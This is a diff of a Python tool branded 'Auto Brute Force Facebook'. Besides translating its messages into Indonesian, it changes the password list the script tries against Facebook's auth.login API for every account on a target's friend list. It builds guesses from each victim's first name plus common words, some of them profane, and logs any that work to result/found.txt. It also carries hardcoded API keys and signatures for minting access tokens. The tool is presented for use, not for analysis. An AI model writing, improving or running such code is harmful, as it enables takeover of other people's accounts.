@@ -31,7 +31,7 @@ RM = "\033[3;91m"
 RE = "\033[0m"
 
 def get(email,pasw):
-	print("%s[*]%s generate access token ..."%(P,W))
+	print("%s[*]%s Membuat token masuk ..."%(P,W))
 	b = open("cookie/token.log","w")
 	try:
 		sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+email+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pasw+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
@@ -43,24 +43,24 @@ def get(email,pasw):
 		if "access_token" in ok:
 			b.write(ok["access_token"])
 			b.close()
-			print("%s[*]%s successfully generate access token"%(G,W))
-			exit("%s[*]%s access token saved: cookie/token.log"%(G,W))
+			print("%s[*]%s Berhasil membuat token masuk..."%(G,W))
+			exit("%s[*]%s Token masuk disimpan di: cookie/token.log"%(G,W))
 		elif "www.facebook.com" in ok["error_msg"]:
 			os.system("rm -rf cookie")
-			print("%s[×]%s failed to generate access token !!"%(R,W))
-			exit("%s[!] %syour account checkpoint !!"%(R,W))
+			print("%s[×]%s Gagal mengambil token masuk !!"%(R,W))
+			exit("%s[!] %sWaduh akun kamu kena checkpoint !!"%(R,W))
 		else:
 			os.system("rm -rf cookie")
-			print("%s[×]%s failed to generate access token !!"%(R,W))
-			exit("%s[!] %swrong email or password !!"%(R,W))		
+			print("%s[×]%s Gagal mengambil token masuk !!"%(R,W))
+			exit("%s[!] %sEmail atau kata sandinya salah !!"%(R,W))		
 	except requests.exceptions.ConnectionError:
-		print("%s[×] %sfailed to generate access token"%(R,W))
-		exit("%s[!] %scheck your connection !!"%(R,W))
+		print("%s[×] %sGagal membuat token masuk..."%(R,W))
+		exit("%s[!] %sGak ada koneksi internet !!"%(R,W))
 def menu(n,toket):
 	global loop
 	loop=0
 	banner()
-	print("%s(●) %sSelamat datang, %s%s"%(G,W,Y,n))
+	print("%s(((●))) %sSelamat datang, Sdr, %s%s"%(G,W,Y,n))
 	print("""
 %s## %s1 Crack Daftar Teman
 %s## %s2 Crack Daftar Dari Teman
@@ -114,7 +114,7 @@ def x(user):
 		pass
 	try:
 		nama = s.get(url.format(user+"?access_token=%s"%(toket))).json()["first_name"]
-		for pas in [nama+"123",nama+"12345",nama+"123456","ID."+nama,nama+".1d","@"+nama,"gas foll"]:
+		for pas in [nama+"123",nama+"12345",nama+"123456",nama+".com","@"+nama,"sayang","anjing","bangsat","ngentot","kontol"]:
 			p = s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pas+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
 			if "access_token" in p:
 				open("result/found.txt","a").write("%s | %s\n"%(user,pas))
@@ -181,11 +181,11 @@ def banner():
 %s[+]%s====== %sAuto Brute Force Facebook%s ======%s[+]%s
 
 ╭══════════════════════════════════════════╮
-║%s# %sAuthor : %sSoesanto%s %s                        ║
-║%s# %sFB     : %sHttps://fb.me/soesanto%s  %s         ║
-║%s# %sGithub : %sHttps://github.com/M3DPR0%s%s   ║
+║%s# %sAuthor : %sSoesanto%s %s                     ║
+║%s# %sFB     : %sHttps://fb.me/soesanto%s  %s      ║
+║%s# %sGithub : %sHttps://github.com/M3DPR0%s%s     ║
 ╰══════════════════════════════════════════╯
- """%(R,W,GB,RE,R,W,Y,W,RM,RE,W,Y,W,CM,RE,W,Y,W,PM,RE,W))
+ """%(R,W,GB,RE,R,W,Y,W,GB,RE,W,Y,W,GB,RE,W,Y,W,GB,RE,W))
 
 if __name__ == '__main__':
 
